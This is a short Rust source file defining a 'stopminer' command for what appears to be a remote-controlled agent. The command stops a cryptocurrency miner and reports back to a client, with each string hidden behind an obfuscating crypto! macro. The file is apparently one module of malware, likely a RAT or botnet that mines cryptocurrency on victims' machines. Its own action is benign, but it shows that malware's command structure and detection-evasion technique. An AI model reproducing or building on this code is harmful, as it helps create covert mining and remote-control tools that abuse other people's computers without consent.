use super::prelude::*;

pub struct Stopminer;

#[async_trait]
impl Command for Stopminer {
    fn name(&self) -> String {
        crypto!("stopminer")
    }

    fn help(&self) -> String {
        crypto!("Stopping crypto miner")
    }

    fn min_args(&self) -> usize {
        0
    }

    async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
        crypto::stop_miner()?;
        client.send(ok(crypto!("Miner has been stopped")))
    }
}
